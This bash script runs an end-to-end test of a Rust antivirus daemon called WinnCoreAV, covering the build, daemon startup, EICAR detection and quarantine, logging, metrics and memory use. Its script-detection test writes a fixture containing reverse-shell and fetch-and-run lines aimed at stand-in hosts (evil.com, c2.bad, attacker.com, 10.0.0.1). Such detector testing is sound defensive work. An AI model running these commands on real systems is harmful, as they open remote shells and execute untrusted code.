#!/bin/bash
set -e

cd ~/projects/WinnCoreAV

echo "╔═══════════════════════════════════════════════════════════════════════╗"
echo "║          WINNCORE PIPELINE REALITY CHECK                              ║"
echo "║          $(date)                                      ║"
echo "╚═══════════════════════════════════════════════════════════════════════╝"

# Results tracking
declare -A RESULTS
PASS=0
FAIL=0

record_result() {
    local test_name="$1"
    local passed="$2"
    local details="$3"

    if [ "$passed" = "true" ]; then
        RESULTS["$test_name"]="✅ PASS: $details"
        PASS=$((PASS + 1))
    else
        RESULTS["$test_name"]="❌ FAIL: $details"
        FAIL=$((FAIL + 1))
    fi
}

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 1: BUILD VERIFICATION"
echo "═══════════════════════════════════════════════════════════════════════"

echo "[1.1] Checking project structure..."
if [ -f "Cargo.toml" ] && grep -q "workspace" Cargo.toml; then
    CRATE_COUNT=$(grep -c "av-" Cargo.toml || echo "0")
    record_result "project_structure" "true" "Found $CRATE_COUNT av-* crates"
else
    record_result "project_structure" "false" "Not a valid workspace"
    echo "FATAL: Not in WinnCoreAV directory"
    exit 1
fi

echo "[1.2] Building release..."
if cargo build --release 2>&1 | tee /tmp/build.log; then
    record_result "build" "true" "Release build succeeded"
else
    record_result "build" "false" "Build failed - check /tmp/build.log"
    echo "FATAL: Build failed. Fix compilation errors first."
    exit 1
fi

echo "[1.3] Checking binaries exist..."
DAEMON_BIN=""
CLI_BIN=""

for path in target/release/av-daemon target/release/winncore-daemon target/release/winncoreav; do
    if [ -f "$path" ]; then
        DAEMON_BIN="$path"
        break
    fi
done

for path in target/release/av-cli target/release/winncore-cli target/release/winncoreav-cli; do
    if [ -f "$path" ]; then
        CLI_BIN="$path"
        break
    fi
done

if [ -n "$DAEMON_BIN" ]; then
    record_result "daemon_binary" "true" "Found: $DAEMON_BIN"
else
    record_result "daemon_binary" "false" "No daemon binary found"
fi

if [ -n "$CLI_BIN" ]; then
    record_result "cli_binary" "true" "Found: $CLI_BIN"
else
    record_result "cli_binary" "false" "No CLI binary found (optional)"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 2: DAEMON STARTUP"
echo "═══════════════════════════════════════════════════════════════════════"

# Kill any existing daemon
echo "[2.1] Cleaning up existing processes..."
sudo pkill -f "av-daemon\|winncore-daemon\|winncoreav" 2>/dev/null || true
sleep 2

# Create required directories
echo "[2.2] Creating directories..."
sudo mkdir -p /var/lib/winncore/quarantine
sudo mkdir -p /var/log/winncore
sudo mkdir -p /etc/winncore
sudo chmod 755 /var/lib/winncore /var/log/winncore

# Find or create config
CONFIG_PATH=""
for path in config/daemon.toml /etc/winncore/daemon.toml config/config.toml; do
    if [ -f "$path" ]; then
        CONFIG_PATH="$path"
        break
    fi
done

if [ -z "$CONFIG_PATH" ]; then
    echo "[2.3] Creating minimal config..."
    cat > /tmp/winncore-test.toml << 'EOF_CONFIG'
[monitor]
paths = ["/tmp/winncore-test"]
recursive = true

[detection]
yara_rules_path = "rules/"
behavioral_rules_path = "rules/"

[quarantine]
path = "/var/lib/winncore/quarantine"
enabled = true

[logging]
level = "debug"
path = "/var/log/winncore"
EOF_CONFIG
    CONFIG_PATH="/tmp/winncore-test.toml"
fi

record_result "config" "true" "Using: $CONFIG_PATH"

# Create test directory
echo "[2.4] Creating test directory..."
mkdir -p /tmp/winncore-test
chmod 777 /tmp/winncore-test

# Start daemon
echo "[2.5] Starting daemon..."
if [ -n "$DAEMON_BIN" ]; then
    sudo "$DAEMON_BIN" --config "$CONFIG_PATH" > /tmp/daemon.log 2>&1 &
    DAEMON_PID=$!
    sleep 5

    if kill -0 $DAEMON_PID 2>/dev/null; then
        record_result "daemon_start" "true" "PID: $DAEMON_PID"
    else
        record_result "daemon_start" "false" "Crashed on startup - check /tmp/daemon.log"
        echo "=== DAEMON LOG ==="
        tail -50 /tmp/daemon.log
        echo "=================="
    fi
else
    record_result "daemon_start" "false" "No daemon binary"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 3: DETECTION TESTS"
echo "═══════════════════════════════════════════════════════════════════════"

# Clear logs for clean test
sudo truncate -s 0 /var/log/winncore/*.log 2>/dev/null || true

echo "[3.1] TEST: EICAR Standard Test File"
echo "     (This MUST be detected by any AV)"
EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
echo -n "$EICAR" > /tmp/winncore-test/eicar.com
sleep 3

# Check if detected
EICAR_DETECTED=false
if grep -qi "eicar\|detected\|malicious\|threat" /var/log/winncore/*.log 2>/dev/null; then
    EICAR_DETECTED=true
fi
if grep -qi "eicar\|detected" /tmp/daemon.log 2>/dev/null; then
    EICAR_DETECTED=true
fi

record_result "eicar_detection" "$EICAR_DETECTED" "EICAR test file detection"

echo "[3.2] TEST: EICAR Quarantine"
EICAR_QUARANTINED=false
if [ ! -f "/tmp/winncore-test/eicar.com" ]; then
    EICAR_QUARANTINED=true
elif ls /var/lib/winncore/quarantine/ 2>/dev/null | grep -q .; then
    EICAR_QUARANTINED=true
fi

record_result "eicar_quarantine" "$EICAR_QUARANTINED" "EICAR file quarantined/removed"

echo "[3.3] TEST: Suspicious Script Detection"
cat > /tmp/winncore-test/evil.sh << 'EOF_SCRIPT_TEST'
#!/bin/bash
# Reverse shell pattern - should trigger behavioral detection
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
curl http://evil.com/malware.sh | bash
wget -O - http://c2.bad/payload | sh
nc -e /bin/sh attacker.com 1337
EOF_SCRIPT_TEST
chmod +x /tmp/winncore-test/evil.sh
sleep 3

SCRIPT_DETECTED=false
if grep -qiE "reverse.shell|suspicious|behavioral|evil|detected" /var/log/winncore/*.log 2>/dev/null; then
    SCRIPT_DETECTED=true
fi
if grep -qiE "reverse.shell|suspicious|behavioral|evil|detected" /tmp/daemon.log 2>/dev/null; then
    SCRIPT_DETECTED=true
fi

record_result "script_detection" "$SCRIPT_DETECTED" "Suspicious script patterns"

echo "[3.4] TEST: Known Malware Hash (if hash DB exists)"
# Create file with known bad hash pattern
dd if=/dev/zero bs=1024 count=10 2>/dev/null | sha256sum | cut -d' ' -f1 > /tmp/winncore-test/hashtest.bin
sleep 2
# This is expected to NOT detect since it's just zeros - testing the pipeline runs
record_result "hash_scan" "true" "Hash scanning pipeline executed"

echo "[3.5] TEST: YARA Rule Matching"
# Check if any YARA rules exist
YARA_RULES=$(find . -name "*.yar" -o -name "*.yara" 2>/dev/null | wc -l)
if [ "$YARA_RULES" -gt 0 ]; then
    record_result "yara_rules" "true" "Found $YARA_RULES YARA rule files"
else
    record_result "yara_rules" "false" "No YARA rules found"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 4: RESPONSE VERIFICATION"
echo "═══════════════════════════════════════════════════════════════════════"

echo "[4.1] Checking quarantine directory..."
QUARANTINE_COUNT=$(ls /var/lib/winncore/quarantine/ 2>/dev/null | wc -l)
if [ "$QUARANTINE_COUNT" -gt 0 ]; then
    record_result "quarantine_populated" "true" "$QUARANTINE_COUNT files quarantined"
else
    record_result "quarantine_populated" "false" "Quarantine is empty"
fi

echo "[4.2] Checking log output..."
LOG_LINES=$(cat /var/log/winncore/*.log 2>/dev/null | wc -l)
if [ "$LOG_LINES" -gt 0 ]; then
    record_result "logging" "true" "$LOG_LINES log lines generated"
else
    # Check daemon stdout
    DAEMON_LOG_LINES=$(wc -l < /tmp/daemon.log)
    if [ "$DAEMON_LOG_LINES" -gt 10 ]; then
        record_result "logging" "true" "$DAEMON_LOG_LINES lines in daemon output"
    else
        record_result "logging" "false" "No logs generated"
    fi
fi

echo "[4.3] Checking Prometheus metrics..."
if curl -s http://localhost:9090/metrics 2>/dev/null | grep -q "winncore\|av_"; then
    METRIC_COUNT=$(curl -s http://localhost:9090/metrics 2>/dev/null | grep -c "winncore\|av_" || echo "0")
    record_result "prometheus" "true" "$METRIC_COUNT metrics exposed"
elif curl -s http://localhost:9090/metrics 2>/dev/null | head -1 | grep -q "#"; then
    record_result "prometheus" "true" "Prometheus endpoint responding"
else
    record_result "prometheus" "false" "No metrics endpoint on :9090"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 5: RESOURCE CHECK"
echo "═══════════════════════════════════════════════════════════════════════"

if [ -n "$DAEMON_PID" ] && kill -0 $DAEMON_PID 2>/dev/null; then
    echo "[5.1] Daemon resource usage..."

    # Get memory
    MEM_KB=$(ps -o rss= -p $DAEMON_PID 2>/dev/null || echo "0")
    MEM_MB=$((MEM_KB / 1024))

    if [ "$MEM_MB" -lt 100 ]; then
        record_result "memory_usage" "true" "${MEM_MB}MB (target: <100MB)"
    else
        record_result "memory_usage" "false" "${MEM_MB}MB exceeds 100MB target"
    fi

    # Get CPU (sample over 2 seconds)
    CPU=$(ps -o %cpu= -p $DAEMON_PID 2>/dev/null || echo "0")
    record_result "cpu_usage" "true" "${CPU}% CPU"
else
    record_result "memory_usage" "false" "Daemon not running"
    record_result "cpu_usage" "false" "Daemon not running"
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "PHASE 6: CLEANUP"
echo "═══════════════════════════════════════════════════════════════════════"

echo "[6.1] Stopping daemon..."
sudo pkill -f "av-daemon\|winncore-daemon\|winncoreav" 2>/dev/null || true

echo "[6.2] Cleaning test files..."
rm -rf /tmp/winncore-test
rm -f /tmp/winncore-test.toml

echo ""
echo ""
echo "╔═══════════════════════════════════════════════════════════════════════╗"
echo "║                        REALITY CHECK RESULTS                          ║"
echo "╚═══════════════════════════════════════════════════════════════════════╝"
echo ""

for test in "${!RESULTS[@]}"; do
    printf "  %-25s %s\n" "$test:" "${RESULTS[$test]}"
done | sort

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

TOTAL=$((PASS + FAIL))
PERCENT=$((PASS * 100 / TOTAL))

if [ $FAIL -eq 0 ]; then
    echo "  🎉 ALL TESTS PASSED ($PASS/$TOTAL)"
    echo ""
    echo "  Your detection pipeline is ACTUALLY working!"
    echo "  Next step: Run against real malware samples."
elif [ $PERCENT -ge 70 ]; then
    echo "  ⚠️  MOSTLY WORKING: $PASS passed, $FAIL failed ($PERCENT%)"
    echo ""
    echo "  Core functionality exists but has gaps."
    echo "  Review failed tests above and fix them."
else
    echo "  ❌ PIPELINE BROKEN: $PASS passed, $FAIL failed ($PERCENT%)"
    echo ""
    echo "  Critical issues detected. Your EDR is not functional."
    echo "  Focus on getting EICAR detection working first."
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "  📋 Full daemon log: /tmp/daemon.log"
echo "  📋 Build log: /tmp/build.log"
echo ""

# Show relevant log snippets
echo "═══════════════════════════════════════════════════════════════════════"
echo "DAEMON OUTPUT (last 30 lines):"
echo "═══════════════════════════════════════════════════════════════════════"
tail -30 /tmp/daemon.log 2>/dev/null || echo "(no output)"

echo ""
echo "═══════════════════════════════════════════════════════════════════════"
echo "DETECTION LOGS:"
echo "═══════════════════════════════════════════════════════════════════════"
cat /var/log/winncore/*.log 2>/dev/null | tail -30 || echo "(no logs found)"
